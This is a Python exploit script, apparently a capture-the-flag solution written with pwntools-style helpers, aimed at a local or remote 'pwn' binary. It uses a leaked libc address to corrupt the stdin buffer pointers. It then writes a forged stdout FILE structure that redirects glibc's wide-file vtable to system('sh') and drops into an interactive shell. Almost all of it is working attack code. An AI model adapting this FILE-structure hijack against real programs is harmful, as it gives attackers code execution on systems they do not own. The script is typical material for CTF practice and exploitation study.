#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


cmd(1)
ru(b"libc_base = ")
libc_base = set_current_libc_base_and_log(int(ru(b"\n", drop=True), 16))

cmd(2)
sl(hex(libc.sym._IO_2_1_stdin_ + 0x38).encode())


def cmd(data):
    ru(b"> ")
    sl(data)


cmd(
    flat(
        {
            0x00: [
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8 + 0x200,
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8 + 0x200,
                0,
                0,
                0,
                0,
            ],
        },
        word_size=64,
    )
)

A_addr = libc.sym._IO_2_1_stdout_
B_addr = libc.sym._IO_2_1_stdout_
apple2 = flat(
    {
        0x8: {
            0x00: b"  sh;",
            0x18: [0],
            0x30: [0],
            0x68: [libc.sym.system],
            0x88: [libc_base + 0x205700],  # lock
            0xA0: [A_addr],
            0xD8: [libc.sym._IO_wfile_jumps],
            0xE0: [B_addr],
        }
    },
    filler=b"\x00",
    word_size=64,
)
cmd(apple2)

ia()
